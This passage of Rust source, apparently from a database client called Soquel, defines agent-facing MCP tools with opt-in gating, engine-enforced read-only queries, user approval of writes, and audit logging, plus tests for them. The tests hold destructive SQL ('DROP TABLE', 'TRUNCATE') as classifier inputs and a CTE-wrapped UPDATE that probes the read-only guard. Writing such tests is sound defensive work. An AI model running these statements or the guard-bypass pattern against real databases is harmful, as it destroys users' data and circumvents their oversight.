      Some(&format!("{}.{}", args.schema, args.table)),
      &outcome,
      started,
    );
    respond(outcome)
  }

  #[tool(
    description = "Run one read-only SQL statement on a connection. Read-only is enforced by the engine; results are capped, paginate with LIMIT/OFFSET."
  )]
  async fn run_query(
    &self,
    Parameters(args): Parameters<QueryArgs>,
  ) -> Result<CallToolResult, McpError> {
    let started = Instant::now();
    let state = self.state();
    let approver = (self.make_approver)();
    let mut call = AgentCall::new(&self.session, approver.as_ref());
    let outcome = run_query_impl(state, &mut call, &args).await;
    audit(
      state,
      "run_query",
      call.approval,
      Some(&args.connection_id),
      Some(&args.sql),
      &outcome,
      started,
    );
    respond(outcome)
  }

  #[tool(description = "Sample rows from a table without writing SQL. Paginated.")]
  async fn sample_rows(
    &self,
    Parameters(args): Parameters<SampleArgs>,
  ) -> Result<CallToolResult, McpError> {
    let started = Instant::now();
    let state = self.state();
    let outcome = sample_rows_impl(state, &args).await;
    audit(
      state,
      "sample_rows",
      None,
      Some(&args.connection_id),
      Some(&format!("{}.{}", args.schema, args.table)),
      &outcome,
      started,
    );
    respond(outcome)
  }
  #[tool(
    description = "List the databases a key-value or document connection exposes. SQL connections use get_schema instead."
  )]
  async fn list_databases(
    &self,
    Parameters(args): Parameters<ConnectionArgs>,
  ) -> Result<CallToolResult, McpError> {
    let started = Instant::now();
    let state = self.state();
    let outcome = list_databases_impl(state, &args).await;
    audit(
      state,
      "list_databases",
      None,
      Some(&args.connection_id),
      None,
      &outcome,
      started,
    );
    respond(outcome)
  }

  #[tool(
    description = "Scan keys on a Redis connection, paginated. Operates on the database the connection is on; agents cannot switch database."
  )]
  async fn list_keys(
    &self,
    Parameters(args): Parameters<KeyScanArgs>,
  ) -> Result<CallToolResult, McpError> {
    let started = Instant::now();
    let state = self.state();
    let outcome = list_keys_impl(state, &args).await;
    audit(
      state,
      "list_keys",
      None,
      Some(&args.connection_id),
      args.pattern.as_deref(),
      &outcome,
      started,
    );
    respond(outcome)
  }

  #[tool(description = "Read one Redis key: its type, TTL and value.")]
  async fn get_key(
    &self,
    Parameters(args): Parameters<KeyArgs>,
  ) -> Result<CallToolResult, McpError> {
    let started = Instant::now();
    let state = self.state();
    let outcome = get_key_impl(state, &args).await;
    audit(
      state,
      "get_key",
      None,
      Some(&args.connection_id),
      Some(&args.key),
      &outcome,
      started,
    );
    respond(outcome)
  }

  #[tool(
    description = "Write a string into a Redis key, waiting for the user to approve it. Redis SET semantics: the key is replaced whatever type it held. Requires the connection to allow writes."
  )]
  async fn set_key(
    &self,
    Parameters(args): Parameters<KeySetArgs>,
  ) -> Result<CallToolResult, McpError> {
    let started = Instant::now();
    let state = self.state();
    let approver = (self.make_approver)();
    let mut call = AgentCall::new(&self.session, approver.as_ref());
    let outcome = set_key_impl(state, &mut call, &args).await;
    audit(
      state,
      "set_key",
      call.approval,
      Some(&args.connection_id),
      Some(&args.key),
      &outcome,
      started,
    );
    respond(outcome)
  }

  #[tool(
    description = "Delete one Redis key, waiting for the user to approve it. Requires the connection to allow writes."
  )]
  async fn delete_key(
    &self,
    Parameters(args): Parameters<KeyArgs>,
  ) -> Result<CallToolResult, McpError> {
    let started = Instant::now();
    let state = self.state();
    let approver = (self.make_approver)();
    let mut call = AgentCall::new(&self.session, approver.as_ref());
    let outcome = delete_key_impl(state, &mut call, &args).await;
    audit(
      state,
      "delete_key",
      call.approval,
      Some(&args.connection_id),
      Some(&args.key),
      &outcome,
      started,
    );
    respond(outcome)
  }

  #[tool(
    description = "Set or clear the expiry of a Redis key, waiting for the user to approve it. Omitting ttlMs clears it (PERSIST). Requires the connection to allow writes."
  )]
  async fn set_ttl(
    &self,
    Parameters(args): Parameters<KeyTtlArgs>,
  ) -> Result<CallToolResult, McpError> {
    let started = Instant::now();
    let state = self.state();
    let approver = (self.make_approver)();
    let mut call = AgentCall::new(&self.session, approver.as_ref());
    let outcome = set_ttl_impl(state, &mut call, &args).await;
    audit(
      state,
      "set_ttl",
      call.approval,
      Some(&args.connection_id),
      Some(&args.key),
      &outcome,
      started,
    );
    respond(outcome)
  }

  #[tool(description = "List the collections of a MongoDB database.")]
  async fn list_collections(
    &self,
    Parameters(args): Parameters<DatabaseArgs>,
  ) -> Result<CallToolResult, McpError> {
    let started = Instant::now();
    let state = self.state();
    let outcome = list_collections_impl(state, &args).await;
    audit(
      state,
      "list_collections",
      None,
      Some(&args.connection_id),
      Some(&args.database),
      &outcome,
      started,
    );
    respond(outcome)
  }

  #[tool(
    description = "Find documents in a MongoDB collection with an optional extended-JSON filter and sort. Paginated."
  )]
  async fn find_documents(
    &self,
    Parameters(args): Parameters<DocFindArgs>,
  ) -> Result<CallToolResult, McpError> {
    let started = Instant::now();
    let state = self.state();
    let outcome = find_documents_impl(state, &args).await;
    audit(
      state,
      "find_documents",
      None,
      Some(&args.connection_id),
      Some(&format!(
        "{}.{} {}",
        args.database,
        args.collection,
        args.filter.as_deref().unwrap_or("{}")
      )),
      &outcome,
      started,
    );
    respond(outcome)
  }

  #[tool(description = "Count documents in a MongoDB collection, with or without a filter.")]
  async fn count_documents(
    &self,
    Parameters(args): Parameters<DocCountArgs>,
  ) -> Result<CallToolResult, McpError> {
    let started = Instant::now();
    let state = self.state();
    let outcome = count_documents_impl(state, &args).await;
    audit(
      state,
      "count_documents",
      None,
      Some(&args.connection_id),
      Some(&format!("{}.{}", args.database, args.collection)),
      &outcome,
      started,
    );
    respond(outcome)
  }

  #[tool(description = "List the indexes of a MongoDB collection.")]
  async fn list_indexes(
    &self,
    Parameters(args): Parameters<CollectionArgs>,
  ) -> Result<CallToolResult, McpError> {
    let started = Instant::now();
    let state = self.state();
    let outcome = list_indexes_impl(state, &args).await;
    audit(
      state,
      "list_indexes",
      None,
      Some(&args.connection_id),
      Some(&format!("{}.{}", args.database, args.collection)),
      &outcome,
      started,
    );
    respond(outcome)
  }

  #[tool(
    description = "Replace one MongoDB document with a new one, waiting for the user to approve it. Full replacement, not a patch; the document must keep the same _id. Requires the connection to allow writes."
  )]
  async fn replace_document(
    &self,
    Parameters(args): Parameters<DocReplaceArgs>,
  ) -> Result<CallToolResult, McpError> {
    let started = Instant::now();
    let state = self.state();
    let approver = (self.make_approver)();
    let mut call = AgentCall::new(&self.session, approver.as_ref());
    let outcome = replace_document_impl(state, &mut call, &args).await;
    audit(
      state,
      "replace_document",
      call.approval,
      Some(&args.connection_id),
      Some(&format!("{}.{}", args.database, args.collection)),
      &outcome,
      started,
    );
    respond(outcome)
  }

  #[tool(
    description = "Delete one MongoDB document, waiting for the user to approve it. Requires the connection to allow writes."
  )]
  async fn delete_document(
    &self,
    Parameters(args): Parameters<DocIdArgs>,
  ) -> Result<CallToolResult, McpError> {
    let started = Instant::now();
    let state = self.state();
    let approver = (self.make_approver)();
    let mut call = AgentCall::new(&self.session, approver.as_ref());
    let outcome = delete_document_impl(state, &mut call, &args).await;
    audit(
      state,
      "delete_document",
      call.approval,
      Some(&args.connection_id),
      Some(&format!("{}.{}", args.database, args.collection)),
      &outcome,
      started,
    );
    respond(outcome)
  }
}

#[tool_handler]
impl ServerHandler for SoquelMcp {
  fn get_info(&self) -> ServerInfo {
    let mut info = ServerInfo::default();
    info.instructions = Some(
      "Soquel exposes the user's database connections to agents. Connections are opted in \
       per profile from the app UI and reads run read-only with engine-level enforcement. \
       Writes are refused unless the profile allows them, and every allowed one waits for \
       the user to approve it in the app. Start with list_connections."
        .to_string(),
    );
    info.capabilities = ServerCapabilities::builder().enable_tools().build();
    info
  }
}

#[cfg(test)]
mod tests {
  use super::*;
  use crate::connectors::{QueryResult, StatementResult};
  use crate::profiles::{ConnectorParams, Env};
  use crate::secrets::InMemoryStore;

  #[test]
  fn ensure_token_is_stable() {
    let secrets = InMemoryStore::default();
    let first = ensure_token(&secrets).unwrap();
    assert_eq!(first.len(), 64);
    assert_eq!(ensure_token(&secrets).unwrap(), first);
  }

  fn profile(name: &str, access: AgentAccess) -> ConnectionProfile {
    ConnectionProfile {
      id: name.to_string(),
      name: name.to_string(),
      env: Env::Dev,
      group: None,
      agent_access: access,
      credential: Default::default(),
      params: ConnectorParams::Sqlite {
        path: "app.db".to_string(),
      },
    }
  }

  #[test]
  fn agent_visible_hides_non_opted_profiles() {
    let visible = agent_visible(vec![
      profile("hidden", AgentAccess::None),
      profile("read", AgentAccess::ReadOnly),
      profile("write", AgentAccess::WriteWithApproval),
    ]);
    let names: Vec<&str> = visible.iter().map(|p| p.name.as_str()).collect();
    assert_eq!(names, ["read", "write"]);
  }

  #[tokio::test]
  async fn bearer_middleware_gates_requests() {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};

    let expected = Arc::new("Bearer sesame".to_string());
    let router = axum::Router::new()
      .route("/mcp", axum::routing::get(|| async { "ok" }))
      .layer(axum::middleware::from_fn(
        move |req: axum::extract::Request, next: axum::middleware::Next| {
          let expected = expected.clone();
          async move { require_bearer(expected, req, next).await }
        },
      ));
    let listener = tokio::net::TcpListener::bind(("127.0.0.1", 0))
      .await
      .unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move { axum::serve(listener, router).await.unwrap() });

    let request = |auth: Option<&'static str>| async move {
      let mut stream = tokio::net::TcpStream::connect(addr).await.unwrap();
      let header = auth
        .map(|a| format!("Authorization: {a}\r\n"))
        .unwrap_or_default();
      let raw =
        format!("GET /mcp HTTP/1.1\r\nHost: 127.0.0.1\r\n{header}Connection: close\r\n\r\n");
      stream.write_all(raw.as_bytes()).await.unwrap();
      let mut response = String::new();
      stream.read_to_string(&mut response).await.unwrap();
      response.lines().next().unwrap().to_string()
    };

    assert!(request(None).await.contains("401"));
    assert!(request(Some("Bearer wrong")).await.contains("401"));
    assert!(request(Some("Bearer sesame")).await.contains("200"));
  }

  #[test]
  fn capped_truncates_rows() {
    let result = QueryResult {
      statements: vec![StatementResult {
        columns: Vec::new(),
        rows: vec![vec![None]; 501],
        rows_affected: 501.0,
      }],
      notices: Vec::new(),
      duration_ms: 1.0,
    };
    let value = capped(result);
    assert_eq!(value["truncated"], true);
    let rows = value["result"]["statements"][0]["rows"].as_array().unwrap();
    assert_eq!(rows.len(), 500);
  }

  use crate::known_hosts::KnownHostsStore;
  use crate::profiles::{ConnectionInput, ProfileStore, SqlServerParams, SslMode};
  use crate::secrets::SecretStore;
  use crate::tunnels::TunnelStore;

  fn pg_params(url: &str) -> ConnectorParams {
    let config: tokio_postgres::Config = url.parse().unwrap();
    // Host::Unix is cfg(unix), so on Windows this match is exhaustive with the one
    // arm: a wildcard would be unreachable there and -D warnings would refuse it.
    let host = match &config.get_hosts()[0] {
      tokio_postgres::config::Host::Tcp(host) => host.clone(),
      #[cfg(unix)]
      tokio_postgres::config::Host::Unix(socket) => {
        panic!("expected a tcp host, got the socket {}", socket.display())
      }
    };
    ConnectorParams::Postgres(SqlServerParams {
      host,
      port: config.get_ports()[0],
      database: config.get_dbname().unwrap().to_string(),
      user: config.get_user().unwrap().to_string(),
      ssl_mode: SslMode::Prefer,
      ssl_root_cert: None,
      tunnel_id: None,
    })
  }

  /// Two profiles against the compose postgres: one opted in, one hidden.
  fn test_state(dir: &tempfile::TempDir, url: &str) -> (AppState, String, String) {
    let mut profiles = ProfileStore::load(dir.path().join("connections.json")).unwrap();
    let opted = profiles
      .create(&ConnectionInput {
        name: "agent-visible".to_string(),
        env: Env::Dev,
        group: None,
        agent_access: AgentAccess::ReadOnly,
        credential: Default::default(),
        params: pg_params(url),
        password: None,
      })
      .unwrap();
    let hidden = profiles
      .create(&ConnectionInput {
        name: "hidden".to_string(),
        env: Env::Dev,
        group: None,
        agent_access: AgentAccess::None,
        credential: Default::default(),
        params: pg_params(url),
        password: None,
      })
      .unwrap();
    let secrets = InMemoryStore::default();
    secrets
      .set(&SecretKey::Connection(opted.id.clone()), "soquel")
      .unwrap();
    secrets
      .set(&SecretKey::Connection(hidden.id.clone()), "soquel")
      .unwrap();
    let state = AppState {
      profiles: std::sync::Mutex::new(profiles),
      tunnels: std::sync::Mutex::new(TunnelStore::load(dir.path().join("tunnels.json")).unwrap()),
      known_hosts: std::sync::Mutex::new(
        KnownHostsStore::load(dir.path().join("known_hosts.json")).unwrap(),
      ),
      command_approvals: std::sync::Mutex::new(
        crate::command_approvals::CommandApprovalsStore::load(
          dir.path().join("command_approvals.json"),
        )
        .unwrap(),
      ),
      secrets: Box::new(secrets),
      secrets_problem: None,
      session_secrets: Default::default(),
      connections: tokio::sync::Mutex::new(HashMap::new()),
      sessions: tokio::sync::Mutex::new(HashMap::new()),
      data_dir: dir.path().to_path_buf(),
      mcp: tokio::sync::Mutex::new(None),
      approvals: tokio::sync::Mutex::new(HashMap::new()),
      trust_windows: tokio::sync::Mutex::new(HashMap::new()),
    };
    (state, opted.id, hidden.id)
  }

  /// Tripwire: adding a tool means visiting the gating test below, which proves
  /// the tool refuses a connection the user never opted in.
  #[test]
  fn the_agent_surface_is_exactly_these_tools() {
    let mut names: Vec<String> = SoquelMcp::tool_router()
      .list_all()
      .into_iter()
      .map(|tool| tool.name.to_string())
      .collect();
    names.sort();
    assert_eq!(
      names,
      [
        "count_documents",
        "delete_document",
        "delete_key",
        "find_documents",
        "get_key",
        "get_schema",
        "get_table_ddl",
        "list_collections",
        "list_connections",
        "list_databases",
        "list_indexes",
        "list_keys",
        "replace_document",
        "run_query",
        "sample_rows",
        "set_key",
        "set_ttl",
      ]
    );
  }

  fn assert_hidden(outcome: Result<serde_json::Value, Error>, tool: &str) {
    let Err(Error::NotFound { message }) = outcome else {
      panic!("{tool} must not reach a non-opted-in profile");
    };
    assert!(message.contains("not found"), "{message}");
  }

  #[tokio::test]
  async fn integration_mcp_opt_in_gates_every_tool() {
    let Ok(url) = std::env::var("SOQUEL_TEST_PG") else {
      return;
    };
    let dir = tempfile::tempdir().unwrap();
    let (state, opted, hidden) = test_state(&dir, &url);

    let list = list_connections_impl(&state).await.unwrap();
    let names: Vec<&str> = list
      .as_array()
      .unwrap()
      .iter()
      .map(|c| c["name"].as_str().unwrap())
      .collect();
    assert_eq!(names, ["agent-visible"]);

    assert_hidden(
      run_query_impl(
        &state,
        &mut call(&FixedApprover(true)),
        &QueryArgs {
          connection_id: hidden.clone(),
          sql: "SELECT 1".to_string(),
        },
      )
      .await,
      "run_query",
    );
    assert_hidden(
      get_schema_impl(
        &state,
        &ConnectionArgs {
          connection_id: hidden.clone(),
        },
      )
      .await,
      "get_schema",
    );
    assert_hidden(
      get_table_ddl_impl(
        &state,
        &TableArgs {
          connection_id: hidden.clone(),
          schema: "app".to_string(),
          table: "customers".to_string(),
        },
      )
      .await,
      "get_table_ddl",
    );
    assert_hidden(
      sample_rows_impl(
        &state,
        &SampleArgs {
          connection_id: hidden.clone(),
          schema: "app".to_string(),
          table: "customers".to_string(),
          limit: None,
          offset: None,
        },
      )
      .await,
      "sample_rows",
    );
    // The kv/doc tools gate on opt-in before they even check the engine kind:
    // this profile is postgres, and the refusal must still be "not found".
    assert_hidden(
      list_databases_impl(
        &state,
        &ConnectionArgs {
          connection_id: hidden.clone(),
        },
      )
      .await,
      "list_databases",
    );
    assert_hidden(
      list_keys_impl(
        &state,
        &KeyScanArgs {
          connection_id: hidden.clone(),
          pattern: None,
          cursor: None,
          count: None,
        },
      )
      .await,
      "list_keys",
    );
    assert_hidden(
      get_key_impl(
        &state,
        &KeyArgs {
          connection_id: hidden.clone(),
          key: "any".to_string(),
        },
      )
      .await,
      "get_key",
    );
    assert_hidden(
      list_collections_impl(
        &state,
        &DatabaseArgs {
          connection_id: hidden.clone(),
          database: "app".to_string(),
        },
      )
      .await,
      "list_collections",
    );
    assert_hidden(
      find_documents_impl(
        &state,
        &DocFindArgs {
          connection_id: hidden.clone(),
          database: "app".to_string(),
          collection: "customers".to_string(),
          filter: None,
          sort: None,
          limit: None,
          cursor: None,
        },
      )
      .await,
      "find_documents",
    );
    assert_hidden(
      count_documents_impl(
        &state,
        &DocCountArgs {
          connection_id: hidden.clone(),
          database: "app".to_string(),
          collection: "customers".to_string(),
          filter: None,
        },
      )
      .await,
      "count_documents",
    );
    assert_hidden(
      list_indexes_impl(
        &state,
        &CollectionArgs {
          connection_id: hidden.clone(),
          database: "app".to_string(),
          collection: "customers".to_string(),
        },
      )
      .await,
      "list_indexes",
    );
    // A write tool must be as blind as a read one: opt-in is checked before the
    // approver, so a hidden profile never even raises a dialog.
    assert_hidden(
      set_key_impl(
        &state,
        &mut call(&FixedApprover(true)),
        &KeySetArgs {
          connection_id: hidden.clone(),
          key: "any".to_string(),
          value: "v".to_string(),
        },
      )
      .await,
      "set_key",
    );
    assert_hidden(
      delete_key_impl(
        &state,
        &mut call(&FixedApprover(true)),
        &KeyArgs {
          connection_id: hidden.clone(),
          key: "any".to_string(),
        },
      )
      .await,
      "delete_key",
    );
    assert_hidden(
      set_ttl_impl(
        &state,
        &mut call(&FixedApprover(true)),
        &KeyTtlArgs {
          connection_id: hidden.clone(),
          key: "any".to_string(),
          ttl_ms: Some(1000.0),
        },
      )
      .await,
      "set_ttl",
    );
    assert_hidden(
      replace_document_impl(
        &state,
        &mut call(&FixedApprover(true)),
        &DocReplaceArgs {
          connection_id: hidden.clone(),
          database: "app".to_string(),
          collection: "customers".to_string(),
          id: "1".to_string(),
          document: "{}".to_string(),
        },
      )
      .await,
      "replace_document",
    );
    assert_hidden(
      delete_document_impl(
        &state,
        &mut call(&FixedApprover(true)),
        &DocIdArgs {
          connection_id: hidden.clone(),
          database: "app".to_string(),
          collection: "customers".to_string(),
          id: "1".to_string(),
        },
      )
      .await,
      "delete_document",
    );
    // Gating happens before any connection attempt.
    assert!(state.connections.lock().await.is_empty());

    // Same code path lets the opted-in profile through (auto-connect included).
    let value = run_query_impl(
      &state,
      &mut call(&FixedApprover(true)),
      &QueryArgs {
        connection_id: opted.clone(),
        sql: "SELECT 1 AS one".to_string(),
      },
    )
    .await
    .unwrap();
    assert_eq!(value["result"]["statements"][0]["rows"][0][0], "1");
    assert!(state.connections.lock().await.contains_key(&opted));
  }

  #[tokio::test]
  async fn integration_mcp_tools_read_only_capped_audited() {
    let Ok(url) = std::env::var("SOQUEL_TEST_PG") else {
      return;
    };
    let dir = tempfile::tempdir().unwrap();
    let (state, opted, _hidden) = test_state(&dir, &url);

    let err = run_query_impl(
      &state,
      &mut call(&FixedApprover(true)),
      &QueryArgs {
        connection_id: opted.clone(),
        sql: "UPDATE app.customers SET name = name".to_string(),
      },
    )
    .await
    .unwrap_err();
    let Error::Unsupported { message } = err else {
      panic!("expected the agent guard to refuse: {err:?}");
    };
    assert!(message.contains("read-only for agents"), "{message}");

    // Defense in depth: a write the classifier reads as a read still dies in
    // the engine's read-only transaction, not on the guard.
    let leaked = run_query_impl(
      &state,
      &mut call(&FixedApprover(true)),
      &QueryArgs {
        connection_id: opted.clone(),
        sql: "WITH touched AS (UPDATE app.customers SET name = name RETURNING id) SELECT * FROM touched"
          .to_string(),
      },
    )
    .await
    .unwrap_err();
    let Error::Database { message } = leaked else {
      panic!("expected a database error: {leaked:?}");
    };
    assert!(message.contains("read-only"), "{message}");

    let value = run_query_impl(
      &state,
      &mut call(&FixedApprover(true)),
      &QueryArgs {
        connection_id: opted.clone(),
        sql: "SELECT generate_series(1, 600)".to_string(),
      },
    )
    .await
    .unwrap();
    assert_eq!(value["truncated"], true);
    let rows = value["result"]["statements"][0]["rows"].as_array().unwrap();
    assert_eq!(rows.len(), 500);

    let schema = get_schema_impl(
      &state,
      &ConnectionArgs {
        connection_id: opted.clone(),
      },
    )
    .await
    .unwrap();
    assert!(
      schema["schemas"]
        .as_array()
        .unwrap()
        .iter()
        .any(|s| s["name"] == "app"),
      "{schema}"
    );

    let ddl = get_table_ddl_impl(
      &state,
      &TableArgs {
        connection_id: opted.clone(),
        schema: "app".to_string(),
        table: "customers".to_string(),
      },
    )
    .await
    .unwrap();
    assert!(ddl.as_str().unwrap().contains("CREATE TABLE"), "{ddl}");

    let sample = sample_rows_impl(
      &state,
      &SampleArgs {
        connection_id: opted.clone(),
        schema: "app".to_string(),
        table: "customers".to_string(),
        limit: Some(3),
        offset: None,
      },
    )
    .await
    .unwrap();
    let rows = sample["result"]["statements"][0]["rows"]
      .as_array()
      .unwrap();
    assert_eq!(rows.len(), 3);

    audit(
      &state,
      "run_query",
      Some(Approval::Asked),
      Some(&opted),
      Some("SELECT 1"),
      &Ok(serde_json::Value::Null),
      Instant::now(),
    );
    let raw = std::fs::read_to_string(state.data_dir.join("mcp-audit.jsonl")).unwrap();
    let entry: serde_json::Value = serde_json::from_str(raw.lines().last().unwrap()).unwrap();
    assert_eq!(entry["tool"], "run_query");
    assert_eq!(entry["ok"], true);
    assert_eq!(entry["connection"].as_str().unwrap(), opted);
  }

  fn bare_state(dir: &tempfile::TempDir) -> AppState {
    AppState {
      profiles: std::sync::Mutex::new(
        ProfileStore::load(dir.path().join("connections.json")).unwrap(),
      ),
      tunnels: std::sync::Mutex::new(TunnelStore::load(dir.path().join("tunnels.json")).unwrap()),
      known_hosts: std::sync::Mutex::new(
        KnownHostsStore::load(dir.path().join("known_hosts.json")).unwrap(),
      ),
      command_approvals: std::sync::Mutex::new(
        crate::command_approvals::CommandApprovalsStore::load(
          dir.path().join("command_approvals.json"),
        )
        .unwrap(),
      ),
      secrets: Box::new(InMemoryStore::default()),
      secrets_problem: None,
      session_secrets: Default::default(),
      connections: tokio::sync::Mutex::new(HashMap::new()),
      sessions: tokio::sync::Mutex::new(HashMap::new()),
      data_dir: dir.path().to_path_buf(),
      mcp: tokio::sync::Mutex::new(None),
      approvals: tokio::sync::Mutex::new(HashMap::new()),
      trust_windows: tokio::sync::Mutex::new(HashMap::new()),
    }
  }

  #[tokio::test]
  async fn regenerate_token_requires_a_stopped_server() {
    let dir = tempfile::tempdir().unwrap();
    let state = bare_state(&dir);
    let first = ensure_token(state.secrets.as_ref()).unwrap();

    *state.mcp.lock().await = Some(McpRunning {
      port: 1,
      cancel: CancellationToken::new(),
    });
    let err = regenerate_token(&state).await.unwrap_err();
    assert!(matches!(err, Error::Unsupported { .. }), "{err:?}");
    assert_eq!(ensure_token(state.secrets.as_ref()).unwrap(), first);

    *state.mcp.lock().await = None;
    let fresh = regenerate_token(&state).await.unwrap();
    assert_ne!(fresh, first);
    assert_eq!(ensure_token(state.secrets.as_ref()).unwrap(), fresh);
  }

  #[test]
  fn settings_default_off_and_round_trip() {
    let dir = tempfile::tempdir().unwrap();
    let state = bare_state(&dir);
    let settings = load_settings(&state);
    assert!(!settings.enabled);
    assert_eq!(settings.port, DEFAULT_PORT);

    save_settings(
      &state,
      McpSettings {
        enabled: true,
        port: 4242,
      },
    );
    let loaded = load_settings(&state);
    assert!(loaded.enabled);
    assert_eq!(loaded.port, 4242);
  }

  #[test]
  fn bind_names_the_port_someone_else_holds() {
    let held = std::net::TcpListener::bind(("127.0.0.1", 0)).unwrap();
    let port = held.local_addr().unwrap().port();

    let err = bind(port).unwrap_err();
    let Error::Unsupported { message } = &err else {
      panic!("{err:?}");
    };
    assert!(message.contains(&port.to_string()), "{message}");
    assert!(message.contains("already in use"), "{message}");
  }

  #[test]
  fn bind_refuses_a_privileged_port_without_asking_the_os() {
    let err = bind(80).unwrap_err();
    assert!(matches!(err, Error::Unsupported { .. }), "{err:?}");
  }

  #[tokio::test]
  async fn set_port_keeps_the_toggle_and_survives() {
    let dir = tempfile::tempdir().unwrap();
    let state = bare_state(&dir);
    assert_eq!(configured_port(&state), DEFAULT_PORT);

    save_settings(
      &state,
      McpSettings {
        enabled: true,
        port: DEFAULT_PORT,
      },
    );
    set_port(&state, 52799).await.unwrap();

    let loaded = load_settings(&state);
    assert!(loaded.enabled, "the toggle is not the port's business");
    assert_eq!(loaded.port, 52799);
    assert_eq!(configured_port(&state), 52799);
  }

  #[tokio::test]
  async fn set_port_refuses_privileged_ports() {
    let dir = tempfile::tempdir().unwrap();
    let state = bare_state(&dir);
    set_port(&state, 52799).await.unwrap();

    let err = set_port(&state, 80).await.unwrap_err();
    assert!(matches!(err, Error::Unsupported { .. }), "{err:?}");
    assert_eq!(configured_port(&state), 52799);
  }

  #[tokio::test]
  async fn set_port_requires_a_stopped_server() {
    let dir = tempfile::tempdir().unwrap();
    let state = bare_state(&dir);
    *state.mcp.lock().await = Some(McpRunning {
      port: DEFAULT_PORT,
      cancel: CancellationToken::new(),
    });

    let err = set_port(&state, 52799).await.unwrap_err();
    assert!(matches!(err, Error::Unsupported { .. }), "{err:?}");
    assert_eq!(configured_port(&state), DEFAULT_PORT);

    *state.mcp.lock().await = None;
    set_port(&state, 52799).await.unwrap();
    assert_eq!(configured_port(&state), 52799);
  }

  /// One agent call from the default test session.
  fn call(approver: &dyn Approver) -> AgentCall<'_> {
    AgentCall::new("session-a", approver)
  }

  /// Answers without a dialog: the decision under test, not the transport.
  struct FixedApprover(bool);

  #[async_trait::async_trait]
  impl Approver for FixedApprover {
    async fn request(&self, _state: &AppState, _request: McpApprovalRequest) -> ApprovalAnswer {
      if self.0 {
        ApprovalAnswer::Once
      } else {
        ApprovalAnswer::Deny
      }
    }
  }

  struct DenyingApprover;

  #[async_trait::async_trait]
  impl Approver for DenyingApprover {
    async fn request(&self, _state: &AppState, _request: McpApprovalRequest) -> ApprovalAnswer {
      ApprovalAnswer::Deny
    }
  }

  /// Grants a trust window, and counts how often the user was actually asked.
  #[derive(Default)]
  struct WindowApprover {
    asked: std::sync::atomic::AtomicUsize,
  }

  impl WindowApprover {
    fn asked(&self) -> usize {
      self.asked.load(std::sync::atomic::Ordering::SeqCst)
    }
  }

  #[async_trait::async_trait]
  impl Approver for WindowApprover {
    async fn request(&self, _state: &AppState, _request: McpApprovalRequest) -> ApprovalAnswer {
      self.asked.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
      ApprovalAnswer::ForWindow
    }
  }

  #[test]
  fn classifies_reads_generously_and_writes_as_writes() {
    for sql in [
      "SELECT 1",
      "  with x as (select 1) select * from x",
      "/* lead */ (SELECT 1)",
      "EXPLAIN SELECT 1",
      "SHOW TABLES",
    ] {
      assert!(crate::connectors::is_read_statement(sql), "{sql}");
    }
    for sql in [
      "INSERT INTO t VALUES (1)",
      "UPDATE t SET a = 1",
      "DELETE FROM t",
      "CREATE TABLE t (id int)",
      "DROP TABLE t",
      "TRUNCATE t",
      "",
    ] {
      assert!(!crate::connectors::is_read_statement(sql), "{sql}");
    }
  }

  #[tokio::test]
  async fn resolve_approval_answers_a_pending_request() {
    let dir = tempfile::tempdir().unwrap();
    let state = bare_state(&dir);
    let (sender, receiver) = tokio::sync::oneshot::channel();
    state
      .approvals
      .lock()
      .await
      .insert("req-1".to_string(), sender);

    resolve_approval(&state, "req-1", ApprovalAnswer::Once)
      .await
      .unwrap();
    assert_eq!(receiver.await.unwrap(), ApprovalAnswer::Once);
    // The slot is consumed: answering twice is a stale request.
    let err = resolve_approval(&state, "req-1", ApprovalAnswer::Once)
      .await
      .unwrap_err();
    assert!(matches!(err, Error::NotFound { .. }), "{err:?}");
  }

  #[tokio::test]
  async fn silence_denies_the_write() {
    let dir = tempfile::tempdir().unwrap();
    let state = bare_state(&dir);
    let receiver = register_approval(&state, "req-quiet").await;

    // Nobody answers: the default must be no, and the slot must not leak.
    let answer = await_approval(
      &state,
      "req-quiet",
      receiver,
      std::time::Duration::from_millis(30),
    )
    .await;
    assert_eq!(answer, ApprovalAnswer::Deny);
    assert!(state.approvals.lock().await.is_empty());
  }

  #[tokio::test]
  async fn a_closed_dialog_denies_the_write() {
    let dir = tempfile::tempdir().unwrap();
    let state = bare_state(&dir);
    let receiver = register_approval(&state, "req-gone").await;
    // Dropping the sender is what a vanished webview looks like.
    state.approvals.lock().await.remove("req-gone");

    assert_eq!(
      await_approval(
        &state,
        "req-gone",
        receiver,
        std::time::Duration::from_secs(5)
      )
      .await,
      ApprovalAnswer::Deny
    );
  }

  #[tokio::test]
  async fn concurrent_requests_resolve_independently() {
    let dir = tempfile::tempdir().unwrap();
    let state = bare_state(&dir);
    let first = register_approval(&state, "req-a").await;
    let second = register_approval(&state, "req-b").await;

    // Answering out of order must not cross the wires.
    resolve_approval(&state, "req-b", ApprovalAnswer::Once)
      .await
      .unwrap();
    resolve_approval(&state, "req-a", ApprovalAnswer::Deny)
      .await
      .unwrap();

    let timeout = std::time::Duration::from_secs(5);
    assert_eq!(
      await_approval(&state, "req-a", first, timeout).await,
      ApprovalAnswer::Deny
    );
    assert_eq!(
      await_approval(&state, "req-b", second, timeout).await,
      ApprovalAnswer::Once
    );
    assert!(state.approvals.lock().await.is_empty());
  }

  /// Blocks until released, and records how many callers were inside at once.
  struct CountingApprover {
    inside: Arc<std::sync::atomic::AtomicUsize>,
    peak: Arc<std::sync::atomic::AtomicUsize>,
    release: Arc<tokio::sync::Notify>,
  }

  #[async_trait::async_trait]
  impl Approver for CountingApprover {
    async fn request(&self, _state: &AppState, _request: McpApprovalRequest) -> ApprovalAnswer {
      use std::sync::atomic::Ordering;
      let now = self.inside.fetch_add(1, Ordering::SeqCst) + 1;
      self.peak.fetch_max(now, Ordering::SeqCst);
      self.release.notified().await;
      self.inside.fetch_sub(1, Ordering::SeqCst);
      ApprovalAnswer::Once
    }
  }

  #[tokio::test]
  async fn an_agent_cannot_answer_a_password_prompt() {
    let dir = tempfile::tempdir().unwrap();
    let (state, id) = sqlite_state(&dir);
    let mut profile = state.profiles.lock().unwrap().get(&id).unwrap();
    profile.credential = crate::profiles::CredentialSource::Prompt;
    state
      .profiles
      .lock()
      .unwrap()
      .replace_all(vec![profile])
      .unwrap();

    let Err(Error::Unsupported { message }) = agent_connection(&state, &id).await.map(|_| ())
    else {
      panic!("the agent must get a plain refusal, not a prompt");
    };
    assert!(message.contains("open it in soquel first"), "{message}");
  }

  #[tokio::test]
